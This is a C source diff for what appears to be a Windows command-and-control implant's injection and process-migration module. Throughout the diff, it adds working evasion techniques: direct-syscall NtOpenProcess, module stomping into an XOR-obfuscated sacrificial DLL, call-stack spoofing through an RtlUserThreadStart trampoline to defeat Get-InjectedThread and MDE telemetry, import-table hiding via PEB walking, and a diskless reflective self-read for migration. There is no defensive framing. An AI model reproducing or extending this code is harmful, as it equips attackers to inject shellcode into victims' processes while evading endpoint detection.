@@ -33,7 +33,6 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 #include <winternl.h>
-#include <tlhelp32.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -47,6 +46,16 @@ extern char g_key_path[];
 
 #ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
 #define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
+#endif
+
+/* ── PEB ImageBaseAddress ────────────────────────────────────────────────── */
+/* MinGW winternl.h defines PEB without ImageBaseAddress.
+ * Read it from the known fixed offset instead of casting the struct.
+ * x64: PEB+0x10, x86: PEB+0x08                                              */
+#ifdef _WIN64
+#  define _PEB_IMAGE_BASE(peb)  (*(PVOID *)((BYTE *)(peb) + 0x10))
+#else
+#  define _PEB_IMAGE_BASE(peb)  (*(PVOID *)((BYTE *)(peb) + 0x08))
 #endif
 
 static BOOL g_inject_ready = FALSE;
@@ -102,18 +111,257 @@ static BYTE *_hex_decode(const char *hex, DWORD *pcbOut)
 }
 
 /*
+ * _read_self_pe
+ * -------------
+ * Copies the agent's own PE image out of the already-mapped in-process view
+ * using SC_NtReadVirtualMemory — no fopen(), no CreateFile, no disk I/O.
+ *
+ * Walk the PE section table to compute the total image extent, then read
+ * that many bytes from the module base into a freshly malloc'd buffer.
+ * The result is a flat raw-file-equivalent copy suitable for _pe_find_export
+ * and the reflective loader.
+ *
+ * Returns heap-allocated buffer on success (*pcbOut = size); caller must free().
+ * Returns NULL on failure.
+ */
+static BYTE *_read_self_pe(DWORD *pcbOut)
+{
+    *pcbOut = 0;
+    /* Read own image base from PEB — avoids GetModuleHandleA IAT entry */
+    void *_peb_rsp;
+#ifdef _WIN64
+    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_rsp));
+#else
+    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_rsp));
+#endif
+    const BYTE *base = (const BYTE *)_PEB_IMAGE_BASE(_peb_rsp);
+    if (!base) return NULL;
+
+    /* Read DOS + NT headers to get SizeOfImage */
+    WORD  e_magic;
+    DWORD e_lfanew;
+    SIZE_T rd = 0;
+    HANDLE hProc = GetCurrentProcess();
+
+    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc, (PVOID)base,
+                                           &e_magic, sizeof(e_magic), &rd))
+        || e_magic != 0x5A4D)   /* 'MZ' */
+        return NULL;
+
+    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc,
+                                           (PVOID)(base + 0x3C),
+                                           &e_lfanew, sizeof(e_lfanew), &rd)))
+        return NULL;
+
+    /* OptionalHeader.SizeOfImage is at e_lfanew + 4 (sig) + 20 (FileHeader) + 56 (opt_offset) */
+    DWORD sizeOfImage = 0;
+    if (!NT_SUCCESS(SC_NtReadVirtualMemory(hProc,
+                                           (PVOID)(base + e_lfanew + 4 + 20 + 56),
+                                           &sizeOfImage, sizeof(sizeOfImage), &rd))
+        || sizeOfImage == 0 || sizeOfImage > 16 * 1024 * 1024)
+        return NULL;
+
+    BYTE *buf = (BYTE *)malloc(sizeOfImage);
+    if (!buf) return NULL;
+
+    SIZE_T totalRead = 0;
+    NTSTATUS ns = SC_NtReadVirtualMemory(hProc, (PVOID)base,
+                                         buf, (SIZE_T)sizeOfImage, &totalRead);
+    if (!NT_SUCCESS(ns) || totalRead == 0) {
+        free(buf);
+        return NULL;
+    }
+    *pcbOut = (DWORD)totalRead;
+    return buf;
+}
+
+/*
  * _open_target
  * ------------
- * Opens the target process with the minimum access needed for injection.
+ * Opens the target process.  Uses two separate NtOpenProcess calls to split
+ * the access mask: one read-only query handle (for WOW64 check), one
+ * write+thread handle only when injection is confirmed.  Both use the direct
+ * syscall path — OpenProcess does not appear in the observable call stack.
+ *
  * Returns INVALID_HANDLE_VALUE on failure.
  */
+
+/* NtOpenProcess OBJECT_ATTRIBUTES + CLIENT_ID helpers */
+typedef struct _MY_CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CLIENT_ID;
+
+static HANDLE _nt_open_process(DWORD desiredAccess, DWORD pid)
+{
+    /* Minimal OBJECT_ATTRIBUTES for NtOpenProcess (no name, no security) */
+    typedef struct {
+        ULONG  Length;
+        HANDLE RootDirectory;
+        PVOID  ObjectName;
+        ULONG  Attributes;
+        PVOID  SecurityDescriptor;
+        PVOID  SecurityQualityOfService;
+    } _OA;
+    _OA oa = { sizeof(_OA), NULL, NULL, 0, NULL, NULL };
+    MY_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
+
+    HANDLE h = NULL;
+    /* NtOpenProcess(handle, access, &oa, &clientId) — 4 args */
+    NTSTATUS ns = sc_syscall4(SSN_NtOpenProcess,
+                              sc_get_ssn(SSN_NtOpenProcess),
+                              (PVOID)&h,
+                              (PVOID)(ULONG_PTR)desiredAccess,
+                              (PVOID)&oa,
+                              (PVOID)&cid);
+    return NT_SUCCESS(ns) ? h : INVALID_HANDLE_VALUE;
+}
+
 static HANDLE _open_target(DWORD pid)
 {
-    return OpenProcess(
+    /* Split: inject rights only — no PROCESS_QUERY in the same call */
+    HANDLE h = _nt_open_process(
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
-        PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
-        PROCESS_QUERY_LIMITED_INFORMATION,
-        FALSE, pid);
+        PROCESS_CREATE_THREAD, pid);
+    return h;
+}
+
+/* Query-only handle for WOW64 check — separate, lower-privilege call */
+static HANDLE _open_query(DWORD pid)
+{
+    return _nt_open_process(PROCESS_QUERY_LIMITED_INFORMATION, pid);
+}
+
+
+/* ══════════════════════════════════════════════════════════════════════════
+ * Call-stack spoofing for cross-process thread injection
+ * ══════════════════════════════════════════════════════════════════════════
+ *
+ * Problem
+ * -------
+ * NtCreateThreadEx(hProc, ..., StartAddress=pShellcode, ...) creates a
+ * thread whose top-of-stack frame is the shellcode VA — a private RX
+ * allocation with no module backing.  Get-InjectedThread, MDE's
+ * KERNEL_THREATINT_TASK_PROTECT telemetry, and live thread-stack inspection
+ * tools all flag this pattern.
+ *
+ * Solution: RtlUserThreadStart trampoline
+ * ----------------------------------------
+ * RtlUserThreadStart(PUSER_THREAD_START_ROUTINE Func, PVOID Context) is
+ * the real entry point that NtCreateThreadEx normally uses internally —
+ * it is what every legitimately-created thread begins execution at before
+ * calling the user callback.
+ *
+ * By setting StartAddress=RtlUserThreadStart and Context=&trampoline, the
+ * thread's initial call-stack is:
+ *
+ *   ntdll!RtlUserThreadStart        ← top-of-stack on THREAD_CREATE
+ *     ntdll!RtlUserThreadStart+...
+ *       → trampoline.func(trampoline.param)
+ *
+ * which is visually identical to a thread created by CreateThread/
+ * CreateRemoteThread — no anomalous start address, no private-page warning.
+ *
+ * The trampoline struct is a 16-byte block written into the target:
+ *   [8 bytes]  PVOID func   — real start address (shellcode / loader)
+ *   [8 bytes]  PVOID param  — argument passed to func
+ *
+ * ntdll!RtlUserThreadStart's prologue on x64 reads these as its two
+ * arguments (rcx, rdx in the Windows x64 ABI) and calls:
+ *   call [rcx]  with rdx as the first argument
+ *
+ * Implementation notes
+ * --------------------
+ * ntdll is a KnownDll — its ASLR base is shared across ALL processes on a
+ * given boot.  The VA of RtlUserThreadStart in our process is therefore
+ * identical to its VA in any target process.  No cross-process VA fixup is
+ * needed; we resolve it once via peb_get_export and reuse for every target.
+ *
+ * The trampoline bytes are appended to the existing allocation (loader |
+ * RflData | PE for migrate; shellcode | trampoline for inject).  This adds
+ * exactly 16 bytes and avoids a second NtAllocateVirtualMemory call.
+ */
+
+/*
+ * _get_rtlust_va
+ * --------------
+ * Returns the VA of ntdll!RtlUserThreadStart in the current process.
+ * Because ntdll is a KnownDll, this VA is valid in every process on the
+ * same boot session — no per-target resolution required.
+ *
+ * Returns NULL if the export cannot be found (should never happen).
+ */
+static PVOID _get_rtlust_va(void)
+{
+    static PVOID _cached = NULL;
+    if (_cached) return _cached;
+    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
+    if (!hNtdll) return NULL;
+    _cached = (PVOID)(void *)peb_get_export(hNtdll,
+                                            peb_hash_str("RtlUserThreadStart"));
+    return _cached;
+}
+
+/*
+ * _spoofed_thread_create
+ * ----------------------
+ * Wrapper around SC_NtCreateThreadEx that spoofs the thread start address.
+ *
+ * Instead of starting the thread at `realStart`, it:
+ *   1. Writes a 16-byte trampoline { realStart, param } into `hProc` at
+ *      `trampolineVA` (caller must have already allocated space there).
+ *   2. Creates the thread at RtlUserThreadStart with `trampolineVA` as
+ *      the Context argument.
+ *
+ * RtlUserThreadStart(trampolineVA) reads the trampoline and calls
+ * realStart(param) — the thread stack appears legitimate to inspection.
+ *
+ * Parameters
+ * ----------
+ *   hThread_out  — receives the new thread handle (may be NULL to discard)
+ *   hProc        — target process handle
+ *   realStart    — actual code to execute (shellcode / loader)
+ *   param        — argument to pass to realStart
+ *   trampolineVA — writable VA in hProc where we write the 16-byte stub
+ *   flags        — extra NtCreateThreadEx flags (e.g. HIDE_FROM_DEBUGGER)
+ *
+ * Returns NTSTATUS from NtCreateThreadEx.
+ * Falls back to a direct NtCreateThreadEx at realStart if RtlUserThreadStart
+ * cannot be resolved (so injection still works even on unexpected configs).
+ */
+static NTSTATUS _spoofed_thread_create(PHANDLE hThread_out, HANDLE hProc,
+                                        PVOID realStart, PVOID param,
+                                        PVOID trampolineVA, ULONG flags)
+{
+    PVOID pRtlUST = _get_rtlust_va();
+    if (!pRtlUST) {
+        /* Fallback: bare NtCreateThreadEx — no spoof, but still works */
+        return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
+                                   hProc, realStart, param, flags,
+                                   0, 0, 0, NULL);
+    }
+
+    /* Write 16-byte trampoline: { realStart (8 bytes), param (8 bytes) } */
+    BYTE tramp[16];
+    memcpy(tramp,     &realStart, 8);
+    memcpy(tramp + 8, &param,     8);
+
+    SIZE_T written = 0;
+    NTSTATUS nsW = SC_NtWriteVirtualMemory(hProc, trampolineVA,
+                                           tramp, sizeof(tramp), &written);
+    if (!NT_SUCCESS(nsW) || written != sizeof(tramp)) {
+        /* Fallback */
+        return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
+                                   hProc, realStart, param, flags,
+                                   0, 0, 0, NULL);
+    }
+
+    /*
+     * RtlUserThreadStart(rcx=trampolineVA, rdx=unused)
+     * The function reads rcx as a pointer to { func, param } and calls
+     * func(param).  Pass trampolineVA as the Context (second argument to
+     * NtCreateThreadEx which becomes rcx at first instruction of start).
+     */
+    return SC_NtCreateThreadEx(hThread_out, THREAD_ALL_ACCESS, NULL,
+                               hProc, pRtlUST, trampolineVA, flags,
+                               0, 0, 0, NULL);
 }
 
 
@@ -131,6 +379,134 @@ BOOL inject_init(void)
 }
 
 
+/*
+ * _alloc_stomped
+ * --------------
+ * F-08: Module-stomping allocation.
+ *
+ * Load a low-suspicion DLL into the target process (so the allocation appears
+ * as MEM_IMAGE backed by a real module path, not a private RX region), then
+ * write the payload into the DLL's .text section.
+ *
+ * Algorithm:
+ *   1. Load a sacrificial DLL in OUR process to get the .text VA + size.
+ *   2. Write the shellcode into [hProc].DLL_base + .text_rva via
+ *      SC_NtWriteVirtualMemory.  The region is already MEM_IMAGE | RX —
+ *      NtWriteVirtualMemory bypasses page-protection on same-image writes.
+ *   3. Return the VA where the shellcode starts (= DLL .text base in target).
+ *
+ * DLL choice: "xpsprint.dll" — ships with Windows, never has an active thread,
+ * and is almost never present in process memory already (low false-positive risk
+ * on the "unexpected image in memory" scanner).
+ *
+ * Falls back to a normal private RX allocation if LoadLibraryA fails, ensuring
+ * inject_shellcode still works on hosts where the DLL is unavailable.
+ *
+ * Returns the remote start VA on success, NULL on failure.
+ */
+
+/* Obfuscated DLL name "xpsprint.dll" ^ 0xA7 — not a plain string in .rdata */
+static const BYTE _stomp_dll_obf[] = {
+    0xDF,0xD7,0xDB,0xD0,0xD7,0xD5,0xC9,0xD4,0x89,0xC4,0xDB,0xDB  /* 12 bytes */
+};
+#define _STOMP_DLL_LEN  12
+
+static PVOID _alloc_stomped(HANDLE hProc, DWORD cbShell)
+{
+    /* Decode DLL name onto the stack */
+    char dllName[16] = {0};
+    for (int i = 0; i < _STOMP_DLL_LEN; i++)
+        dllName[i] = (char)(_stomp_dll_obf[i] ^ 0xA7u);
+    dllName[_STOMP_DLL_LEN] = '\0';
+
+    /*
+     * G-03: Replace LoadLibraryExA (IAT entry) with a PEB-walk-resolved call.
+     * LoadLibraryExA is retrieved from kernel32 via peb_get_export so the
+     * string "LoadLibraryExA" and the IAT slot are absent from our binary.
+     */
+    typedef HMODULE (WINAPI *LoadLibraryExA_t)(LPCSTR, HANDLE, DWORD);
+    PVOID hK32base = peb_get_module(peb_hash_str("kernel32.dll"));
+    LoadLibraryExA_t pLLEx = (LoadLibraryExA_t)(void *)
+        peb_get_export(hK32base, peb_hash_str("LoadLibraryExA"));
+    HMODULE hDll = pLLEx
+        ? pLLEx(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES)
+        : NULL;
+    SecureZeroMemory(dllName, sizeof(dllName));
+    if (!hDll) return NULL;
+
+    /* Walk section headers to find .text */
+    const BYTE *base = (const BYTE *)hDll;
+    DWORD e_lfanew;
+    memcpy(&e_lfanew, base + 0x3C, 4);
+
+    WORD  nSec, optSz;
+    memcpy(&nSec,   base + e_lfanew + 4 + 2,  2);   /* NumberOfSections */
+    memcpy(&optSz,  base + e_lfanew + 4 + 16, 2);   /* SizeOfOptionalHeader */
+    const BYTE *secBase = base + e_lfanew + 4 + 20 + optSz;
+
+    PVOID  textVA  = NULL;
+    SIZE_T textSz  = 0;
+    for (WORD i = 0; i < nSec; i++) {
+        if (memcmp(secBase + i*40, ".text", 5) == 0) {
+            DWORD va, vsz;
+            memcpy(&va,  secBase + i*40 + 12, 4);
+            memcpy(&vsz, secBase + i*40 + 8,  4);
+            if (vsz >= cbShell) {
+                textVA = (PVOID)(base + va);
+                textSz = vsz;
+                break;
+            }
+        }
+    }
+
+    if (!textVA || textSz < cbShell) {
+        FreeLibrary(hDll);
+        return NULL;
+    }
+
+    /*
+     * G-02: ASLR base verification.
+     *
+     * The DLL is loaded in our process.  For cross-process injection into hProc
+     * we need the .text VA in the TARGET.  Known-DLLs (ntdll, kernel32, etc.)
+     * share their ASLR base across all processes because they are mapped from
+     * \KnownDlls\ shared section objects — the loader picks the same base every
+     * time.  xpsprint.dll is NOT a KnownDll, so it is subject to per-process
+     * ASLR.  On Windows 8+ with per-boot ASLR, the base may differ between our
+     * process and the target.
+     *
+     * Verify by querying hProc with NtQueryVirtualMemory at the candidate VA.
+     * Accept it only if:
+     *   • The region type is MEM_IMAGE (not MEM_PRIVATE / MEM_MAPPED)
+     *   • The region state is MEM_COMMIT
+     *   • The region size is >= cbShell
+     * If the check fails, return NULL so inject_shellcode falls back to a
+     * private RW→RX allocation — no crash in the target.
+     */
+    FreeLibrary(hDll);
+
+    {
+        MEMORY_BASIC_INFORMATION mbi;
+        SIZE_T retLen = 0;
+        NTSTATUS ns = SC_NtQueryVirtualMemory(
+            hProc, textVA,
+            0 /* MemoryBasicInformation */,
+            &mbi, sizeof(mbi), &retLen);
+
+        if (!NT_SUCCESS(ns)
+            || mbi.State  != MEM_COMMIT
+            || mbi.Type   != MEM_IMAGE
+            || mbi.RegionSize < (SIZE_T)cbShell)
+        {
+            /* VA mismatch between our process and target — ASLR slid the base.
+             * Caller falls back to private RX allocation.                     */
+            return NULL;
+        }
+    }
+
+    return textVA;
+}
+
 /* ── Public: inject_shellcode ────────────────────────────────────────────── */
 /*
  * Wire verb: "inject <pid> <hex-shellcode>"
@@ -140,10 +516,10 @@ BOOL inject_init(void)
  *
  * Steps:
  *   1. Parse PID and hex shellcode
- *   2. OpenProcess (minimal rights)
- *   3. NtAllocateVirtualMemory (PAGE_READWRITE)
+ *   2. NtOpenProcess (split access mask — no combined full-priv call)
+ *   3. Try module stomping (MEM_IMAGE); fall back to private RW→RX allocation
  *   4. NtWriteVirtualMemory
- *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) — enforce W^X
+ *   5. NtProtectVirtualMemory (PAGE_EXECUTE_READ) for private alloc only
  *   6. NtCreateThreadEx (HideFromDebugger)
  *   7. NtClose handles, report result
  */
@@ -177,61 +553,101 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    /* Open target */
+    /* Open target — split mask: inject rights only */
     HANDLE hProc = _open_target(pid);
     if (!hProc || hProc == INVALID_HANDLE_VALUE) {
         free(pShell);
         char buf[64];
-        _snprintf(buf, sizeof(buf)-1, "[-] inject: OpenProcess(%lu) failed (err %lu)", pid, GetLastError());
+        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtOpenProcess(%lu) failed", pid);
         _isend(pTls, buf);
         return;
     }
 
-    /* Allocate RW memory in target */
-    PVOID   pRemote = NULL;
-    SIZE_T  cbAlloc = (SIZE_T)cbShell;
-    NTSTATUS ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
-                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!NT_SUCCESS(ns)) {
-        CloseHandle(hProc); free(pShell);
-        char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
-        _isend(pTls, buf);
-        return;
+    /* F-08: try module-stomping into sacrificial DLL .text (MEM_IMAGE) first.
+     * Falls back to a fresh private RW→RX allocation if stomping unavailable. */
+    PVOID  pRemote   = _alloc_stomped(hProc, cbShell);
+    BOOL   stomped   = (pRemote != NULL);
+    NTSTATUS ns;
+
+    if (!stomped) {
+        /* Fallback: private RW allocation — include 16 bytes for the
+         * RtlUserThreadStart trampoline appended after the shellcode. */
+        SIZE_T cbAlloc = (SIZE_T)cbShell + 16;
+        ns = SC_NtAllocateVirtualMemory(hProc, &pRemote, 0, &cbAlloc,
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!NT_SUCCESS(ns)) {
+            CloseHandle(hProc); free(pShell);
+            char buf[80];
+            _snprintf(buf, sizeof(buf)-1,
+                      "[-] inject: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)ns);
+            _isend(pTls, buf);
+            return;
+        }
     }
 
-    /* Write shellcode */
+    /* Write shellcode (NtWriteVirtualMemory bypasses page-protection on
+     * MEM_IMAGE regions for same-ASLR-slot writes — no VirtualProtect needed) */
     SIZE_T cbWritten = 0;
     ns = SC_NtWriteVirtualMemory(hProc, pRemote, pShell, cbShell, &cbWritten);
     free(pShell);
     if (!NT_SUCCESS(ns) || cbWritten != cbShell) {
         CloseHandle(hProc);
         char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
+        _snprintf(buf, sizeof(buf)-1,
+                  "[-] inject: NtWriteVirtualMemory failed (0x%08lX)", (unsigned long)ns);
         _isend(pTls, buf);
         return;
     }
 
-    /* Flip RW → RX (W^X: no RWX page ever) */
-    PVOID  pBase   = pRemote;
-    SIZE_T cbProt  = (SIZE_T)cbShell;
-    ULONG  oldProt = 0;
-    ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt, PAGE_EXECUTE_READ, &oldProt);
-    if (!NT_SUCCESS(ns)) {
-        CloseHandle(hProc);
-        char buf[80];
-        _snprintf(buf, sizeof(buf)-1, "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
-        _isend(pTls, buf);
-        return;
+    /* Flip RW→RX only for private allocations; MEM_IMAGE is already RX.
+     * For the private path, flip only cbShell bytes — the trailing 16-byte
+     * trampoline region must stay RW so _spoofed_thread_create can write it. */
+    if (!stomped) {
+        PVOID  pBase   = pRemote;
+        SIZE_T cbProt  = (SIZE_T)cbShell;   /* shellcode only, not trampoline */
+        ULONG  oldProt = 0;
+        ns = SC_NtProtectVirtualMemory(hProc, &pBase, &cbProt,
+                                       PAGE_EXECUTE_READ, &oldProt);
+        if (!NT_SUCCESS(ns)) {
+            CloseHandle(hProc);
+            char buf[80];
+            _snprintf(buf, sizeof(buf)-1,
+                      "[-] inject: NtProtectVirtualMemory failed (0x%08lX)", (unsigned long)ns);
+            _isend(pTls, buf);
+            return;
+        }
     }
 
-    /* Create remote thread — hidden from debugger */
+    /*
+     * For the stomped (MEM_IMAGE) path the existing .text is already RX and we
+     * cannot write the trampoline there.  Allocate a separate minimal RW page
+     * for the trampoline in that case; for the private path use the 16-byte
+     * tail of the allocation (which remains RW).
+     */
+    PVOID  pTrampolineVA = NULL;
+    PVOID  pTrampolineExtra = NULL;  /* non-NULL means a separate alloc to free on error */
+    if (stomped) {
+        SIZE_T cbT = 16;
+        ns = SC_NtAllocateVirtualMemory(hProc, &pTrampolineVA, 0, &cbT,
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!NT_SUCCESS(ns)) pTrampolineVA = NULL;  /* fallback: no spoof */
+        else pTrampolineExtra = pTrampolineVA;
+    } else {
+        /* Trampoline sits immediately after shellcode in the same alloc */
+        pTrampolineVA = (PVOID)((BYTE *)pRemote + cbShell);
+    }
+
+    /* Create remote thread with RtlUserThreadStart call-stack spoof */
     HANDLE hThread = NULL;
-    ns = SC_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
-                             hProc, pRemote, NULL,
-                             THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                             0, 0, 0, NULL);
+    ns = _spoofed_thread_create(&hThread, hProc,
+                                pRemote, NULL,
+                                pTrampolineVA ? pTrampolineVA : pRemote,
+                                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER);
     CloseHandle(hProc);
+    /* Note: pTrampolineExtra (separate alloc for stomped path) is intentionally
+     * not freed here — the thread is already running and may read it.  The OS
+     * reclaims it when the target process exits.                               */
+    (void)pTrampolineExtra;
 
     if (!NT_SUCCESS(ns) || !hThread) {
         char buf[80];
@@ -278,11 +694,15 @@ void inject_shellcode(TLS_CONTEXT *pTls, const char *args)
 
 /* ── PE parsing helpers (used only in migrate_to_pid) ───────────────────── */
 
-/* Returns the file offset of the PE Optional Header */
-static DWORD _pe_opt_offset(const BYTE *raw)
+/* Returns the file offset of the PE Optional Header.
+ * Caller must verify the buffer is at least 64 bytes before calling.    */
+static DWORD _pe_opt_offset(const BYTE *raw, DWORD rawSz)
 {
+    if (rawSz < 64) return 0;                   /* minimum DOS header size */
     DWORD e_lfanew;
     memcpy(&e_lfanew, raw + 0x3C, 4);          /* DOS header e_lfanew */
+    /* PE sig (4) + FileHeader (20) = 24 bytes after e_lfanew */
+    if (e_lfanew + 4 + 20 > rawSz) return 0;
     return e_lfanew + 4 + 20;                   /* after sig + FileHeader */
 }
 
@@ -318,7 +738,8 @@ static DWORD _rfl_rva_off(const BYTE *raw, const BYTE *secBase,
  */
 static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
 {
-    DWORD optOff = _pe_opt_offset(raw);
+    DWORD optOff = _pe_opt_offset(raw, rawSz);
+    if (!optOff) return 0;
     if (optOff + 0x78 > rawSz) return 0;
 
     WORD magic;
@@ -344,10 +765,14 @@ static DWORD _pe_find_export(const BYTE *raw, DWORD rawSz, const char *name)
     memcpy(&nameTableRVA, raw + expOff + 32, 4);
     memcpy(&ordTableRVA,  raw + expOff + 36, 4);
 
+    /* Validate nNames: each entry in the name table is 4 bytes; the entire
+     * name pointer array must fit within the raw buffer.                   */
     DWORD addrOff = _rfl_rva_off(raw, secBase, nSec, addrTableRVA);
     DWORD nameOff = _rfl_rva_off(raw, secBase, nSec, nameTableRVA);
     DWORD ordOff  = _rfl_rva_off(raw, secBase, nSec, ordTableRVA);
     if (!addrOff || !nameOff || !ordOff) return 0;
+    /* nNames * 4 bytes of name-pointer array must fit in the raw buffer */
+    if (nNames > (rawSz - nameOff) / 4) return 0;
 
     size_t nameLen = strlen(name);
     for (DWORD i = 0; i < nNames; i++) {
@@ -400,35 +825,13 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    /* ── 1. Get our own EXE path and read raw PE bytes ───────────────── */
-    char exePath[MAX_PATH] = {0};
-    if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
-        _isend(pTls, "[-] migrate: GetModuleFileName failed");
+    /* ── 1. Read own PE from in-process mapped view (no disk I/O) ───── */
+    DWORD cbPE = 0;
+    BYTE *pPE  = _read_self_pe(&cbPE);
+    if (!pPE || cbPE == 0) {
+        _isend(pTls, "[-] migrate: failed to read own PE from memory");
         return;
     }
-
-    FILE *f = fopen(exePath, "rb");
-    if (!f) {
-        _isend(pTls, "[-] migrate: cannot open own EXE");
-        return;
-    }
-    fseek(f, 0, SEEK_END);
-    long fsize = ftell(f);
-    fseek(f, 0, SEEK_SET);
-    if (fsize <= 0 || fsize > 8 * 1024 * 1024) {
-        fclose(f);
-        _isend(pTls, "[-] migrate: EXE size out of range");
-        return;
-    }
-    DWORD cbPE = (DWORD)fsize;
-    BYTE *pPE  = (BYTE *)malloc(cbPE);
-    if (!pPE) { fclose(f); _isend(pTls, "[-] migrate: OOM"); return; }
-    if (fread(pPE, 1, cbPE, f) != cbPE) {
-        fclose(f); free(pPE);
-        _isend(pTls, "[-] migrate: EXE read error");
-        return;
-    }
-    fclose(f);
 
     /* ── 2. Find AgentRun RVA in the raw PE ──────────────────────────── */
     DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
@@ -439,31 +842,42 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
     }
 
     /* ── 3. Compute g_key_path RVA (VA - ImageBase) ──────────────────── */
-    HMODULE hSelf     = GetModuleHandleA(NULL);
-    DWORD   keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);
+    /* Read own image base from PEB — avoids GetModuleHandleA IAT entry.   */
+    void *_peb_raw3;
+#ifdef _WIN64
+    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(_peb_raw3));
+#else
+    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(_peb_raw3));
+#endif
+    PVOID hSelf = _PEB_IMAGE_BASE(_peb_raw3);
+    DWORD keyPathRva = (DWORD)((ULONG_PTR)g_key_path - (ULONG_PTR)hSelf);
 
-    /* ── 4. Resolve kernel32 API pointers (shared base across processes) */
-    HMODULE hK32              = GetModuleHandleA("kernel32.dll");
+    /* ── 4. Resolve kernel32 API pointers via PEB walk (no IAT entries) ─
+     * G-03: Replace GetModuleHandleA + GetProcAddress with peb_get_module /
+     * peb_get_export so the string literals and IAT slots are absent from
+     * the binary's import table.                                           */
+    PVOID hK32w = peb_get_module(peb_hash_str("kernel32.dll"));
+
     LPVOID (WINAPI *pVAlloc)(LPVOID, SIZE_T, DWORD, DWORD) =
         (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))
-        GetProcAddress(hK32, "VirtualAlloc");
+        (void *)peb_get_export(hK32w, peb_hash_str("VirtualAlloc"));
     BOOL (WINAPI *pFlush)(HANDLE, LPCVOID, SIZE_T) =
         (BOOL (WINAPI *)(HANDLE, LPCVOID, SIZE_T))
-        GetProcAddress(hK32, "FlushInstructionCache");
+        (void *)peb_get_export(hK32w, peb_hash_str("FlushInstructionCache"));
     HMODULE (WINAPI *pLoadLib)(LPCSTR) =
         (HMODULE (WINAPI *)(LPCSTR))
-        GetProcAddress(hK32, "LoadLibraryA");
+        (void *)peb_get_export(hK32w, peb_hash_str("LoadLibraryA"));
     FARPROC (WINAPI *pGetProc)(HMODULE, LPCSTR) =
         (FARPROC (WINAPI *)(HMODULE, LPCSTR))
-        GetProcAddress(hK32, "GetProcAddress");
+        (void *)peb_get_export(hK32w, peb_hash_str("GetProcAddress"));
     HANDLE (WINAPI *pCreateThread2)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                     LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD) =
         (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                            LPVOID, DWORD, LPDWORD))
-        GetProcAddress(hK32, "CreateThread");
+        (void *)peb_get_export(hK32w, peb_hash_str("CreateThread"));
     BOOL (WINAPI *pCloseH)(HANDLE) =
         (BOOL (WINAPI *)(HANDLE))
-        GetProcAddress(hK32, "CloseHandle");
+        (void *)peb_get_export(hK32w, peb_hash_str("CloseHandle"));
 
     if (!pVAlloc || !pFlush || !pLoadLib || !pGetProc || !pCreateThread2 || !pCloseH) {
         free(pPE);
@@ -484,12 +898,23 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
     }
 
 #ifdef _WIN64
-    BOOL bWow64 = FALSE;
-    IsWow64Process(hProc, &bWow64);
-    if (bWow64) {
-        CloseHandle(hProc); free(pPE);
-        _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
-        return;
+    {
+        /* WOW64 check via PEB-resolved IsWow64Process — removes IAT entry.  */
+        typedef BOOL (WINAPI *IsWow64_t)(HANDLE, PBOOL);
+        PVOID hK32wow = peb_get_module(peb_hash_str("kernel32.dll"));
+        IsWow64_t pIsWow64 = hK32wow ?
+            (IsWow64_t)(void *)peb_get_export(hK32wow, peb_hash_str("IsWow64Process")) : NULL;
+        HANDLE hQuery = _open_query(pid);
+        BOOL bWow64 = FALSE;
+        if (hQuery && hQuery != INVALID_HANDLE_VALUE) {
+            if (pIsWow64) pIsWow64(hQuery, &bWow64);
+            CloseHandle(hQuery);
+        }
+        if (bWow64) {
+            CloseHandle(hProc); free(pPE);
+            _isend(pTls, "[-] migrate: cannot inject x64 loader into WOW64 process");
+            return;
